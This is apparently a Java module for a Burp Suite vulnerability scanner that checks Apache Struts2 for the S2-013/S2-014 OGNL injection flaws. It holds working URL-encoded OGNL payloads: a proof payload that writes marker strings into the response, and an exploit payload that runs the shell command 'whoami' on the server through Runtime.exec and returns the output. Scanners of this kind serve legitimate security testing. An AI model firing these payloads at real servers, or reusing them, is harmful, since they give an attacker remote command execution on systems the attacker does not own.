package module;

import burp.*;
import burp.Util;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class S2_013_014 extends IModule {
    public S2_013_014() {
        poc =
            "${" +
            "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
            "#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter()," +
            "#out.print(\"" + injectMark[0] + "\")," +
            "#out.print(\"" + injectMark[1] + "\")," +
            "#out.flush()," +
            "#out.close()" +
            "}";
        poc = URLEncoder.encode(poc);

        exp =
            "${" +
            "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
            "#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()," +
            "#b=new java.io.InputStreamReader(#a)," +
            "#c=new java.io.BufferedReader(#b)," +
            "#d=new char[50000]," +
            "#c.read(#d)," +
            "#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter()," +
            "#out.println(new java.lang.String(#d))," +
            "#out.close()" +
            "}";
        exp = URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        List<IParameter> iParameters = requestInfo.getParameters();
        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }
        IParameter newParameter = helpers.buildParameter(Util.getRandomString(6), poc, in);
        request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);

        if (check()) {
            this.detail = exp;
            return creatCustomScanIssue();
        }
        return null;
    }

}
